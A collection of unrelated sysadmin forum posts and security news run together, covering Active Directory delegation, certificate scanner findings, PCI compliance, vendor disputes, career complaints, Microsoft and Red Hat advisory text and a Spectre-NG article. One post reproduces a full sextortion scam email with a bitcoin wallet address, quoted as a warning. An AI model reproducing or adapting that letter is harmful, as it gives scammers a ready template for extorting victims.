will be released that will change the default behavior of **EnableTGTDelegation** to add a safe default configuration. If delegation is required across trusts, this flag should be set to **Yes** before the July 2019 updates are installed. After this update, any newly created trusts will have the new default of **EnableTGTDelegation** trust flag set to **No**. &gt; ### July 9, 2019 &gt; * An update will be released that will force the trust flag on **existing** trusts and disable TGT delegation by default. Any trust that has been configured to continue using delegation after May 14, 2019 will not be affected. # This article continues [at the source](URL Please, please, please read and understand so you do not get bitten by this.

At the end, I should be more aware of what the security holes are and what I should try and secure and how. With the results I'll be going to the 3rd party domotic system administrator and be adjusting my own systems as well. I.e., might result in using a VPN for remote access.

One of the most common vectors of malware and spearphishing of privileged accounts. * Don't browse as root, and don't have ""Administrator"" privileges on your regular account. * Unstructured read-write fileshares replaced with alternatives like databases, webapps, versioned object storage. This limits the damage that can be done by any regular user account, in particular. * Hardened workstations or thin-client type devices like Chromebooks.

So be me, fresh out of college landing a security position in vulnerability management at a decently sized company at around 12k employees. Granted I didn't know jack about anything so I was lucky as hell even getting this initial job. The team picked on me alot but the way my personality works I just laughed it off and due to this they grew a liking for me being a young kid and these gentlemen were in their 40s. To give you a better perspective, 4 of the other 5 guys on the team were actually pen testers, so there humor was a little darker than normal but as is mine. Coming out of college I thought I was hot shit, which I can acknowledge, and what these guys did was tear apart my soul bit by bit by basically calling me out on bullshit and keeping me in check. Basically this happened until my ego was destroyed and from there they rebuilt me to be a guy that was more open to learning. They were all really knowledgable. Working under them I learned alot in terms of networking and just other normal things sys admins would know. Anyway, fast forward a couple years, I'm still at this company and have started contributing tremendously to the company. I loved what I was doing. However I never saw a raise. My coworkers even saw this and told me to find another job or else they would beat my ass because I deserved compensation. So I leave to go to a bank and got a HUGE pay bump. I went to join the vuln mgmt team and by God it was a total shit show. There are more managers than there are technical people. I was put under a 28 year old guy who doesnt know shit about security or anything about networks. And the head boss guy just loves using buzzwords like ""cloud"" and ""cyber"". I was literally 1 button away from standing up a postgres DB on prem where I wiped this old appliance no one used, installed ubuntu and postgres, then worked with other teams to get the communications right but was pulled off because the boss guy wanted it in the cloud. I had to explain to my 28 year old lead and his boss that ports 139 and 445 both used SMB. Yeah I get it if you dont know it and can learn, but dont act like you are better than me, cut me off from projects just as I am about to complete them which would improve the company, and not listen to me when i advise caution and shit breaks because you decided not to listen. I wasnt learning anything, I couldnt take it and demanded I be transferred to another team. I forgot to mention all these managers came together from another company and have formed this little clique where they keep everyone else out of the loop and basically just treat the rest of us as slaves to their bidding. Now I am part of a governance team. It's really not bad since the people are better. But God these people are not technical in the least. I had to explain to them today what a DMZ was. Due to me being somewhat technical (I understand the basics somewhat but apparently I'm like the shining turd here) I understand alot more than everyone else on my team and am now being bombarded with requests from all over since no one actually understand networks and computers. I acknowledge I am far from actually being good, but it's weird to be seen as a saint and think of myself as of fraud. Needless to say I am on the market. I am young and still have a lot to learn and this isn't the environment to learn in and want to achieve my final goal of being a pen tester one day. /rant"

Looking at the issues marked as High importance, I can see the 3 following ones that points to Alertlogic not liking self-signed certificates on Domain Controllers and servers for LDAPs and RDP: SSL - Certificate Authenticity &amp; Trust Chain Validation Issue TCP 3269 High SSL - Certificate Authenticity &amp; Trust Chain Validation Issue TCP 636 High Our servers are protected by firewalls and nothing is published to the outside world. The remediation would be to issue certificates from a third-party and use them on all DCs for LDAP and RDP. Personally I think that is a lot of work and maintenance, not that we have too many DCs but the thing is that Alertlogic support tells us that we could eventually mark this threat as false positive, I don't want to start flagging everything as false positive so I would like to know your take on using slef-signed certificates for AD servers. The whole alert description: &gt; Concern: To achieve good transport layer security, SSL certificates are typically issued by third parties that create a &gt; chain of Certification Authorities that guarantee bindings of identification information to public encryption keys. This &gt; allows for a chain of trust to be established. &gt; &gt; While a server certificate by itself does provide adequate encryption, if the chain of authority cannot be verified, &gt; then it is at high risk to man-in-the-middle attacks. This can allow an attacker to eavesdrop on the conversation. &gt; Without the chain of Certificate Authorities to verify authenticity of a digital SSL certificate, the user will have no &gt; way of detecting of the man-in-the-middle attack. &gt; &gt; PCI Data Security Standards require ASVs to verify the authenticity of SSL Certificates. SSL Certificates that cannot &gt; be verified as authentic are an automatic PCI failing vulnerability. &gt; &gt; PCI DSS Requirements and Security Assessment Procedures v1.2: 2.3 Encrypt all non-console administrative access. Use &gt; technologies such as SSH, VPN, or SSL/TLS for web-based management and other non-console administrative access. Verify &gt; that strong encryption methods are invoked and Verifying that administrator access to the web-based management &gt; interfaces are encrypted with strong cryptography. &gt; &gt; Solution: The most common reason for this SSL issue is the failure to install the Certificate Authorities &gt; ""intermediate certificate"". &gt; &gt; One of the requirements for good key management is to limit the compromise of a key to as small a group as possible. &gt; To achieve this, CAs introduce the Intermediate Certificate. If the Intermediate Certificate is ever revoked then that &gt; certificate would be revoked rather then the CA's ""Root"" certificate. &gt; &gt; Browsers automatically have a list of ""trusted root"" certificates. However, to complete the chain of trust, &gt; it is your responsibility to install the Intermediate Signing Certificate from your CA. &gt; &gt; &gt; Install an Intermediate Certificate that has been issued by a reputable third party CA. &gt; &gt; GoDaddy - URL &gt; &gt; Comodo - URL &gt; &gt; Symantec - &gt; URL &gt; ewlocale=en_US &gt; &gt; Thawte - &gt; URL &gt; &amp;ichbox[]=en_US&amp;question_box=install+Intermediate+Certificate &gt; &gt; Risk Level (CVSS): High (7.8 AV:N/AC:M/Au:N/C:C/I:P/A:N/E:POC/RL:W/RC:C) &gt; &gt; PCI Severity: Fail &gt; &gt; Evidence: Port: TCP/3269 192.168.1.1:3269 &gt; &gt; Informative Details: depth=0 DC = local, DC = acme, DC = corp, OU = Domain Controllers, CN = serverDC01 &gt; verify error:num=20:unable to get local issuer certificate &gt; verify return:1 &gt; depth=0 DC = local, DC = acme, DC = corp, OU = Domain Controllers, CN = serverDC01 &gt; verify error:num=27:certificate not trusted &gt; verify return:1 &gt; depth=0 DC = local, DC = acme, DC = corp, OU = Domain Controllers, CN = serverDC01 &gt; verify error:num=21:unable to verify the first certificate &gt; verify return:1 &gt; &gt; Detection Protocol: TLS/SSL - Unknown &gt; &gt; Exposure ID: 32692 &gt; &gt; CPE of Detected Product: cpe:/p:protocol:ldap &gt; &gt; Additional Vectors &gt; &gt; Root Cause: Software Feature &gt; Risk Factor: High &gt; Skill Level: High &gt; Likelihood: Low &gt; Data Loss: true &gt; System Loss: false &gt; Access Control Loss: false &gt; Reputation Loss: false &gt; Info Theft: true &gt; Disclosure: false &gt; Downtime: false &gt; Monitoring Failure: false &gt; &gt; References: &gt; &gt; URL "

My gut says that they were using our vulnerable network as a reflector for a DDOS. &amp;#x200B; We've blocked the IP and I'm continuing to monitor the network. I'm also running virus scans but nothing is coming up. There doesn't seem to be any information out there about issues with this either. The systems are mostly Windows 10 with everything up to date. &amp;#x200B; Anyone have any idea what happened here? Is there a SQL vulnerability that I can defend against? I'm very anxious to figure this out."

I know that Tape is a growing market that can afford to charge premiums, but today things got absolutely ridiculous. A few years before I got into my current position, the IT director decided that there was a need for tape backups. At the time it was a relatively small company, but they had a lot of data that did not need to sit on pools of spinning drives. The IT director made the decision to go with Quantum, because they were the upstream manufacturer for the same model of tape autochangers that Dell and IBM were selling, and at the time Quantum was a cheaper option. Today, Myself and the current IT director decided that it was time to expand our tape storage array, and made a call to Quantum to price out another Scalar i3 expansion bay. This is where the comedy show began. While talking with the sales guy about what we were looking to buy, he informed us that our current unit was out of it's support period. I was a little surprised, since the same model we have is still being sold on their website. He explained that it's not warranty, but that the slot licences on the machine had expired, and in order to add an expansion to the unit, we would need to re-up our license. This would also make the device able to update it's firmware to the newest version. I asked how much the licence renewal would be for our unit. He replied calmly with..... ***$57,000 dollars.*** For a single Scalar i3, with 1 expansion bay. They honestly wanted nearly 60K before even purchasing another expansion bay. He then went on to inform me that there's a known exploitable vulnerability in the firmware on our device if it's before a certain version, and in order to ""make sure we are safe"" we would be required to pay up. I laughed out loud on the phone, and told him that was an absolutely insane price to pay just to upgrade a single tape changer. Out of curiosity, i asked how often we were expected to renew our licence on the device in order to be ""allowed"" to expand it and receive updates. Apparently they expect that kind of money every single year, and are more than happy to try and hold you hostage with vulnerable firmware to do so. We never even got a notification of this lapse and assumed the auto-updates were still running. While still laughing I hung up the phone. Right after I started googling to see who else on the market has a similar product. After just a few minutes of searching, I found out a vendor that was already on our list of accounts sells tape auto-loaders too, and at a much better price. I decide to give them a call, and my call is answered immediately. I get talking with a fantastic service agent who was possibly the easiest person to talk to out of all the vendor calls I've ever made in my life. Every question I asked had an immediate and well educated answer even when I brought up our specific backup software and requirement for Linux or BSD as the host operating system. No problem, she laid out all the supported connection methods, what interface cards were supported, and was even able to tell me that our specific backup software was 100% supported on these units. We're getting 2 new tape changers, with extra expansion bays, 4 tape drives per unit, and a full compliment of tapes too (WITH FREE PRE-PRINTED LABELS!) for less than the cost of renewing a garbage license with Quantum for a single year. So shout-out to Qualstar! Your completely **No Bullshit** experience has won me over, and you get bumped straight to the top of my vendor shortlist. "

The email failed SPF and landed in quarantine where he released it to his inbox... the second time this happened. I tried to setup a Office365 where all emails with failed SPF should be deleted which is apparently not possible - But that's another story. I just wanted yo share with you since I am amazed how lucrative this scam is. When looking up the bitcoin address (first transaction 27 Jan 19) already received 9 BTC! That's $40K and there is no malicious software or fake login page involved. Also much less targeted than CEO fraud. Hello! I have very bad news for you. 12/10/2018 - on this day I hacked your OS and got full access to your account distributionlist@company.com You can change the password, yes... But my malware intercepts it every time. How I made it: In the software of the router, through which you went online, was a vulnerability. I just hacked this router and placed my malicious code on it. When you went online, my trojan was installed on the OS of your device. After that, I made a full dump of your disk (I have all your address book, history of viewing sites, all files, phone numbers and addresses of all your contacts). A month ago, I wanted to lock your device and ask for a not big amount of btc to unlock. But I looked at the sites that you regularly visit, and I was shocked by what I saw!!! I'm talk you about sites for adults. I want to say - you are a BIG pervert. Your fantasy is shifted far away from the normal course! And I got an idea.... I made a screenshot of the adult sites where you have fun (do you understand what it is about, huh?). After that, I made a screenshot of your joys (using the camera of your device) and glued them together. Turned out amazing! You are so spectacular! I'm know that you would not like to show these screenshots to your friends, relatives or colleagues. I think $659 is a very, very small amount for my silence. Besides, I have been spying on you for so long, having spent a lot of time! Pay ONLY in Bitcoins! My BTC wallet: 145SmyE7DBEQExsnXZobojbQqr5UdgbCHh You do not know how to use bitcoins? Enter a query in any search engine: ""how to replenish btc wallet"". It's extremely easy For this payment I give you two days (48 hours). As soon as this letter is opened, the timer will work. After payment, my virus and dirty screenshots with your enjoys will be self-destruct automatically. If I do not receive from you the specified amount, then your device will be locked, and all your contacts will receive a screenshots with your ""enjoys"". I hope you understand your situation. - Do not try to find and destroy my virus! (All your data, files and screenshots is already uploaded to a remote server) - Do not try to contact me (this is not feasible, I sent you an email from your account) - Various security services will not help you; formatting a disk or destroying a device will not help, since your data is already on a remote server. P.S. You are not my single victim. so, I guarantee you that I will not disturb you again after payment! This is the word of honor hacker I also ask you to regularly update your antiviruses in the future. This way you will no longer fall into a similar situation. Do not hold evil! I just do my job. Have a nice day!"

I need some advice from my more experienced friends on my situation and hopefully some perspective. This may be a tad long, but I appreciate any input. **History:** Im currently an Information Security Analyst at a small Level 1 PCI compliant service provider owned by one of the largest entertainment brands in the world. Ive been in this role for \~2 years. Prior to this role I have about 2 years of experience as a SOC Analyst for a massive retail organization and 5-7 years of experience in everything from helpdesk to Jr Sysadmin to leadership of\~15 person teams. Im 28, I dont have a college degree, I have a lapsed S+ and N+, a fully current CySA+ and Amazon Web Services Security Practitioner certification and I make $70,000 a year salary with no bonus potential. Some travel, occasionally I get voluntold work stupid long hours at super famous events which is cool(ish) I guess. **Situation:** The company I work for now is 75 people fully staffed, I report directly to our CTO(who is a software engineer by trade), and the only person approaching a peer within 800 miles I have is our Sr. Systems Engineer who doubles as our DevOps Engineer and happens to have some experience in the cloud security realm. **1)** Im mostly asked to focus on our PCI program and an internal compliance framework developed by our parent org(more or less 60% ISO, 20% NIST, 20% PCI). This involves everything from 2 program audits a year(where I assess my own work and report up with it) to scoping, planning, coordinating and executing any projects needed to improve our maturity, and dealing with all supporting activities like managing our annual PCI audit with our QSA to updating all policy, standard and guideline documentation etc. Also GDPR/CCPA stuff, etc. **2)** On top of basically being our Compliance program manager, I also run our risk management program. This includes quarterly meetings with our leadership team, managing our risk register and classifying/triaging risks as they are identified, and much like our compliance objectives I personally plan, manage, control and execute any projects needed to manage our risks(transfer, mitigate, etc.) **3)** I also handle all of our threat and vulnerability management activities. Right now these are pretty bare-bones as we dont have a ton of resources to actually tackle anything I find, but I still find, surface, track and attempt to bring attention to everything from AppSec issues to emerging threats to gaps in our code reviews etc. Probably the area that gives me the most heartburn and the area I get the least traction on remediation work. Basically, I deal with anything and everything related to information security with a bit of help from our Sr Systems Engineer when he can and a lot of Yes security is important BUT conversations with leadership. **The good:** I like my job and the people in the office. Im VERY good at my job. I get to work directly with Directors and CISOs at other orgs owned by our parent company and they all value my input and treat me like im a peer. Im working in a super dynamic and fairly bleeding edge environment. Im able to contribute enough that I feel like we arent terrible stewards of peoples PII or PCI data which is more than I can say for a lot of my professional network. I have the option to be remote basically as much as I want (up to 100% starting later this year). My work matters and I control my own destiny here. **The not so good:** My boss is not a good mentor and doesnt offer me much direction on anything so any projects or professional development I work on happens mostly in a vacuum. I feel like im fighting a losing battle on a lot of fronts and I dont have the resources to get out of the hole we were in when I started. I cant shake the feeling that im not paid or titled appropriately for the level/scope of work im doing BUT also I cant shake the feeling im underqualified for the work so its hard to feel like Im worth more. The stress and chaos gets to me pretty bad most days/nights. And before we get into the usual Find a new job and quit! responses, im aware thats an option, but If I do that it needs to be about what im running to, not what im running from. Nothing I get contacted for right now is either in my scope of experience, something I want to do, or something I think I can do. Basically, I need some perspective on this situation. I stand to learn a LOT here. Im young for an analyst, especially one doing what im doing at the level I am and im super super secure in my job, but I also definitely get taken advantage of and I dont feel like I dont have the resources to do my job OR any mentorship/development support. **Tl;dr** Security Analyst isnt sure how to analyze his own job "

You might be asking yourself why I'm doing this. I use Veeam for backing up my VM's. Veeam does not support Kerberos. It will only use NTLM authentication. NTLM is very easy to perform a MITM attack on because it doesn't validate server or client. The service account that Veeam uses is an administrator on my domain controllers so that I can use application-aware processing. If the NTLM hash is intercepted, that means an attacker effectively has administrator access to my domain controllers. You can understand why this is a huge vulnerability. Thoughts? Suggestions?

The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited the vulnerability could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerability could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. &gt;In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerability through Internet Explorer and then convince a user to view the website, for example, by sending an email. &gt;The security update addresses the vulnerability by modifying how the scripting engine handles objects in memory.

379,vulnerability,sysadmin,PCI Compliance for Small (tiny - 1.5 employee) Company - UK Based,1,a7rv0u,https://www.reddit.com/r/sysadmin/comments/a7rv0u/pci_compliance_for_small_tiny_15_employee_company/,2018-12-20 10:25:35,"I'm helping one of my parents get their website PCI compliaant. They are an online business with 1 full time staff (my parent) and one part-time staff based in the UK. We've sorted out the website and server so the scan for that comes back passed, however the questionnaire is insanely detailed and clearly not something I can answer on my own. Before I go down the route of paying for consultants to do this and things like internal vulnerability scans (quotes at about 1500 per year for that scan alone) I want to understand if such a small business needs to jump through ""all the hoops"". For example with recent GDPR stipulations small business had much less severe committments than larger corporations. We don't even store any cardholder details. The only reason we are caught in this at all is that we offer payment through 2 options. Paypal via a pop-up that redirect users to the PayPal site, and then we also offer direct PayPal intergration through our site. The latter requires the compliance because we effectively transmit cardholder data through our server even though none of our users ever see it, store or it or as I understand it can do anything with it (its encrypted). We have one part-time web developer and they are the only person who ever even accesses our AWS server. Is there any kind of short cut to becoming compliant under these circumstances or do I need to find a consultant to do a full, in-depth assessment for the 'office' our personal home, and the AWS environment. We find that the integrated PayPal has far higher conversion rates but it may not be worth keeping given the costs to maintain compliancy. Thanks in advance for thoughts. &amp;#x200B;"

This vulnerability is actively being exploited and allows an attacker to run code, as the current user, on a system that connects to a malicious web site. Microsoft has classified the vulnerability as Critical on workstation operating systems and Moderate on servers. **Bold**Workarounds Microsoft has reported a workaround that involves removing privileges from the jscript.dll file for the Everyone group. This is not expected to negatively impact functionality as IE uses a different file by default. This may be a good step for anyone that deems the risk of this vulnerability to be high, but are not able to patch systems. See the first referenced article for more details. **Bold**Recommendation Since this vulnerability is being actively exploited, CCL recommends testing and pushing out the patch to user workstations through your emergency out-of-band patching processes, as soon as possible. For servers, we recommend that you assess the risk this vulnerability poses to your environment, considering any existing controls to mitigate the risk of a web-based exploit on servers. For example, if servers do not have access to browse the Internet, a standard update during the next regular patching cycle may be appropriate. **Bold**References URL URL URL URL "

Warranty expired last year and we were planning on doing upgrades so we didn't renew (only 7 machines). Last week I was doing some maintenance and (foolishly) decided to update the BIOS to the latest on these machines to counteract the Spectre bug I had read about. My ninite pro also suggested this update since it was a hardware vulnerability. I updated the bios on 5 machines and rebooted, no problems. They used the machines for several days. This morning I come in and 2 of them have died. Nothing happens when they are powered on. You press the power button and nothing (no lights, no spinning fan, nothing). I decided to replace one of the dead ones with an available workstation from a client that was no longer here. The client was running and powered on. I shut it down and moved it to my lab to run some software updates. When I plugged it in and tried to power it on, there was nothing. No lights, no fan spinning, nothing, just like the others. Tested multiple power adapters and everything. I'm assuming this has something to do with the BIOS update, as all the clients that had the BIOS updated are exhibiting the same symptoms: bios updated, restarted just fine, ran for a week. When powered down, they don't come back up. It's as if they don't have any power at all. I'm worried the other machines will do the same if powered off. I'm working with dell's out of warranty to see what the issue could be. I'll probably end up just purchasing new machines and learning from this mistake (not renewing support). I'm just curious if anyone has seen ANYTHING like this before with this desktop model (OptiPlex 9020m) and BIOS (A18)."

I need a good way to monitor that this is happening on a regular basis. There are about 100 servers (VMs and KVM hosts). Or maybe an Apache vulnerability is announced and I need to see all servers with Apache versions less than 2.4.x. We already have a Zabbix agent running on each for monitoring if that can help somehow for uptime. We also have a Puppet agent running on each for configuration management (though I haven't found a clear way to pull installed packages into puppetdb for display in PuppetBoard). All servers are Debian and Ubuntu, but it would be nice to support CentOS in case we need to in the future. We are using PDQ Inventory for our Windows servers and clients. I feel like I have so much more insight over our Windows environment than our Linux environment. It's really nice to have all of that information, and hundreds more items at my fingertips and be able to slice-and-dice that information into reports or collections that I can automatically deploy software to or configure items for.

TL;DR DCs are accessible by domain admins and server operators, is this flawed or best practice? I've had a rough run-in with a strong personality within my organization over our current permission sets on our Active Directory domain and really need a leg to stand on before I confront the individual again. To give a bit of background on myself and my mindset going into the situation I must first say that I'm a highly security conscious individual to an almost-paranoid degree. I'm a former security auditor/analyst that has gone back to his roots by becoming a sysad for 2 relatively small domains (500-1000 users) where my primary responsibilities revolve around endpoint security. Now, the issue at hand. Our domain controllers are currently accessible by two permission groups, Domain Admins and Server Operators. Both of these permission sets are derived from the built-in security groups within AD. The server operator group has local-logon rights to the Domain Controller and has full access to NETLOGON and SYSVOL. In my mind, this is a massive vulnerability. The justification for this is that if one of our various remote sites has issues with their respective DC, that they need to be able to access it. My counter-argument to that statement is that if they had any issues, it would be within group policy or AD and could be remediated by scoping the ACLs of the respective sites to allow full control over their respective OUs allowing us to restrict DCs by only permitting Domain Admins to log in. Mind you that we have a Microsoft PFE on-site once a month or so that hasn't identified this as an issue. Am I just paranoid? Reference: [URL"

Did a little bit of digging and discovered the following link: [URL It reads as followed &gt;""A remote code execution vulnerability exists in the Yammer desktop application due to the loading of arbitrary content. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user. If the current user is logged on with administrative user rights, an attacker could take control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights. &gt; &gt;To exploit this vulnerability, an attacker needs to convince the victim to click the special URL in the desktop application that redirect to the attacker-controlled web-page. After the content from attacker-controlled web-page is loaded by the desktop application, the attacker can gain control of the victims machine. &gt; &gt;The security update addresses the vulnerability by disallowing loading of arbitrary content in the desktop application."" &amp;#x200B; At this point I am definitely concerned and am considering taking much more serious action.

Having taken these precautions afer further reading these Latitude and Thinkpad laptops now seem to be vulnerable because of Intel AMT active management technology and realise this MEBx can be accessed without a BIOS or system password rendering my previous efforts useless. I cannot find a way to disable it since the option is not there when CTRL P or F12 is selected and shows the boot order screen.

""L1TF arises due to a CPU optimization related to the handling of address translations when performing a page table walk. When translating a linear address, the CPU may encounter a terminal page fault which occurs when the paging structure entry for a virtual address is not present (Present bit is 0) or otherwise invalid. This will result in an exception, such as a page fault, or TSX transaction abort along the architectural path. However, before either of these occur, a CPU that is vulnerable to L1TF may initiate a read from the L1 data cache for the linear address being translated. For this speculative-only read, the page frame bits of the terminal (not present) page table entry are treated as a system physical address, even for guest page table entries. If the cache line for the physical address is present in the L1 data cache, then the data for that line may be forwarded on to dependent operations that may execute speculatively before retirement of the instruction that led to the terminal page fault. The behavior related to L1TF can occur for page table walks involving both conventional and extended page tables (the latter of which is used for virtualization)."" Frankly, as someone who is new to the field it's a bit of a mouthful and may take a few readthroughs to figure it all out. "

At the company I work at we help customers pass compliance. We can come in and setup various solutions like SIEM, vulnerability scanners, offer training on the tools/best practices so they can stay secure after we leave, and interact with the auditors to ensure everything goes smoothly. One very common thing I see time and time again are people running Windows servers with the built in drivers for everything. We are talking about Windows 2012 R2 deployments that are years old still running the same drivers from day one. We have been working with one customer for about 2 months now trying to get them to update their drivers because they have they are running Broadcom NICs that have the well known VMQ issue: URL Their senior sysadmin refused to update their NIC drivers even though we gave them multiple links that say to either disable VMQ or update their drivers. The network performance was so bad the solution we were building was having time out issues doing anything. FTP from the system would time out, SSH would lag and randomly disconnect, web interface would sometimes get time out message, any scans from the VM to anything not on that Hyper-V hyper-visor time out, etc. After 1 months of trouble shooting we got MS support involved and after a few weeks they come back with the same thing, disable VMQ or update your drivers. During this time the senior sysadmin also does some other stupid crap and fights us on some things to the point of trying to make any changes requires multiple meetings to go over our requests. Finally my boss had enough as I needed to go onsite for another customer (they specifically requested me as I worked their audit last year) so he told them last Monday that this weekend they need to either update their firmware, disable VMQ, or we will walk away from them as they aren't following our security advice so we can't sign off on them being secure. This get's their CEO's attention who agrees to do the driver update. This past Friday night they did the driver update and guess what? The driver update fixed their issue. From an email exchange that I think they forgot I'm on it sounds like the update also fixed some other issues they were having like backups that weren't completing and some VM's losing access to network shares. We had a conference call with them where my boss made sure to point out to them that they were paying for 2 months worth of billable hours for an issue that we had emailed them the fix for back on June 3 but they refused to follow the fix. Needless to say their CFO wasn't too happy about the news as we are talking 5 figures worth of billable hours and we told them we won't be giving them any type of discounts on those hours. I'm glad this week I'm starting on the other customer's site as the conversation that was going on in the call made it clear the CFO wanted the senior sysadmin's head over a massive bill that could have been avoided if the guy had done his damn job of updating drivers. This isn't the first time I've seen this and likely won't be the last time."

The fact that it's a US product is a concern, given the US's tendencies lately -- and that its pricing is in USD (who'd want to sign up with a product, just to have to swap to a different solution next year when the subscription price may skyrocket?). OpenVAS seems pretty good, but from what I can glean from their info and some posts, it seems like the community/free editions don't do some server-based tests, don't get all the feeds, can't schedule scans, etc. In order to get the OpenVAS commercial/enterprise models (Greenbone), it seems like we'd need to order hardware pre-loaded with it from Europe, which is sorta nutty for our case.

A malicious DHCP server, or an attacker on the local network able to spoof DHCP responses, could use this flaw to execute arbitrary commands with root privileges on systems using NetworkManager which is configured to obtain network configuration using the DHCP protocol. Background Information The DHCP protocol is used to configure network related information in hosts from a central server. When a host is connected to a network, it can issue DHCP requests to fetch network configuration parameter such as IP address, default router IP, DNS servers, and more. The DHCP client package dhclient provided by Red Hat has a script /etc/NetworkManager/dispatcher.d/11-dhclient (in Red Hat Enterprise Linux 7) or /etc/NetworkManager/dispatcher.d/10-dhclient (in Red Hat Enterprise Linux 6) for the NetworkManager component, which is executed each time NetworkManager receives a DHCP response from a DHCP server.

Since I obviously lack the ops experience of actually having to manage Windows networks I hope I can hear from you guys why you use it. We are currently using RDP with TLS, certificates are signed by our own CA and deployed to all servers. The obvious attack is mitm'ing a connection, which will result in a validation error and of course all users are trained to stop here and report this :,( As far as I understand CredSSP, the user's machine will connect to the CredSSP server using TLS, then speak SPNEGO through this tunnel and do Kerberos or NTLM. This will move load from the Terminal Server and reduce the susceptibility for DoS attacks of the server. Great, one advantage, but to be honest we don't care too much about DoS. CredSSP also allows SSO, which is nice to have but not really relevant for our environment. So, to recap: the two advantages SSO and reduced DoS attack surface are nice to have, but not relevant for us. Do you have other reasons for enabling NLA, other than not having to deal with the same scanner finding over and over again? Thanks a lot for your input."

According to information exclusively available to c't, researchers have already found eight new security holes in Intel processors. The vulnerabilities known as Spectre and Meltdown shook the IT world to its foundations: researchers proved that there is a fundamental design flaw in all modern processors with serious repercussions for system security (see c't issue 3/2018). After several patches were released, it seemed everything would be fine after all, although some experts warned that more revelations could follow. But the hope remained that the manufacturers could solve the problem with a few security updates. As it turns out, we can bury that hope. A total of eight new security flaws in Intel CPUs have already been reported to the manufacturer by several teams of researchers. For now, details on the flaws are being kept secret. All eight are essentially caused by the same design problem  you could say that they are Spectre Next Generation. c't has exclusive information on Spectre-NG, which we have been able to verify in several ways  we double and triple checked all the facts. Nonetheless, we will not publish technical details as long as there is still a chance that manufacturers will get their security updates ready before the details of the flaws become public. However, we will use our information to report about future releases of patches and provide background information. Eight new security flaws Each of the eight vulnerabilities has its own number in the Common Vulnerability Enumerator (CVE) directory and each requires its own patches. It is likely that each vulnerability will receive its own name. Until then, we will jointly call these flaws Spectre-NG in order to distinguish them from the previously uncovered issues. So far we only have concrete information on Intel's processors and their plans for patches. However, there is initial evidence that at least some ARM CPUs are also vulnerable. Further research is already underway on whether the closely related AMD processor architecture is also susceptible to the individual Spectre-NG gaps, and to what extent. Intel is already working on its own patches for Spectre-NG and developing others in cooperation with the operating system manufacturers. According to our information, Intel is planning two waves of patches. The first is scheduled to start in May; a second is currently planned for August. Knowing that Google Project Zero discovered one of the Spectre-NG flaws gives us an idea of when to expect the first patch. Googles elite hackers are scrupulous about observing the 90 day deadline that is meant to give companies time to address flaws after they have been notified  but they have no qualms about going public when the deadline ends, even if a patch has yet to be released. Time will run out on May 7  the day before the next Windows patch day. Intel itself expects that information about a second flaw could be published any day now. Therefore, we can expect to see patches for these two vulnerabilities sooner rather than later. There are signs that Microsoft is also preparing for CPU patches. Originally the Redmond based company expected the problems would be solved through microcode updates. Now it seems the fixes (or mitigations) will be distributed as (optional) Windows updates. PC manufacturers are simply taking too long to provide BIOS updates. Microsoft is also offering up to $250,000 in a bug bounty program for Spectre flaws. Linux kernel developers are continuously working on hardening measures against Spectre attacks as well. More dangerous than Spectre Intel itself classifies four of the Spectre-NG vulnerabilities as ""high risk""; the remaining four are rated as ""medium"". According to our own research, risks and attack scenarios at Spectre-NG are similar to those at Spectre  with one exception. One of the Spectre-NG flaws simplifies attacks across system boundaries to such an extent that we estimate the threat potential to be significantly higher than with Spectre. Specifically, an attacker could launch exploit code in a virtual machine (VM) and attack the host system from there  the server of a cloud hoster, for example. Alternatively, it could attack the VMs of other customers running on the same server. Passwords and secret keys for secure data transmission are highly sought-after targets on cloud systems and are acutely endangered by this gap. Intel's Software Guard Extensions (SGX), which are designed to protect sensitive data on cloud servers, are also not Spectre-safe. Although attacks on other VMs or the host system were already possible in principle with Spectre, the real-world implementation required so much prior knowledge that it was extremely difficult. However, the aforementioned Spectre-NG vulnerability can be exploited quite easily for attacks across system boundaries, elevating the threat potential to a new level. Cloud service providers such as Amazon or Cloudflare and, of course, their customers are particularly affected. Still, the concrete danger for private individuals and corporate PCs is rather small, because there are usually other weak points which are easier to exploit. Nevertheless, they should be taken seriously and the upcoming Spectre-NG updates should be installed quickly after their release. However, if the past is any indication, things won't go so smoothly in practcice. Even when the Spectre updates were made available, there were several glitches, despite a lead time of more than six months. In addition, some patches reduce performance and some companies refuse BIOS updates for computers that are only a few years old. All this will get worse rather than better with Spectre NG. A fundamental security problem Overall, the Spectre-NG gaps show that Spectre and Meltdown were not a one-off slip-up. It is not just a simple gap that could be plugged with a few patches. Rather, it seems that for each fixed issue, two others crop up. This is the result of the fact that during the past twenty years, safety considerations have only played second fiddle to performance in processor development. An end to patches for hardware problems of the Spectre category is not in sight. But a never-ending flood of patches is not an acceptable solution. You can't shrug off the fact that the core component of our entire IT infrastructure has a fundamental security problem that will keep leading to more problems. Of course, Intel needs to fix the current weaknesses as quickly as possible  and that's what is happening. At the same time, however, the CPU design needs to be fundamentally rethought. Werner Haas of the German company Cyberus Technology and one of the co-discoverers of Spectre/Meltdown, considers it quite possible to equip high-performance processors with a solid security design. However, this would require security aspects to be taken into account in the architecture right from the start. Paul Kocher, who was also involved in unveiling Spectre, suggested implementing additional, specially secured CPU cores. And with methods such as threat modeling, risky techniques can be implemented in such a way that security remains controllable. Intel made the promise of ""security first"" at the beginning of January. Now the company must provide more transparency and, for example, publish risk analyses of potential weak points. So far, Intel has been acting more along the lines of ""We are the experts, we're doing it right"", relying on technologies such as the Intel Management Engine and the Software Guard Extensions. We should no longer be fobbed off with vague promises when it comes to central components of our IT infrastructure. URL"

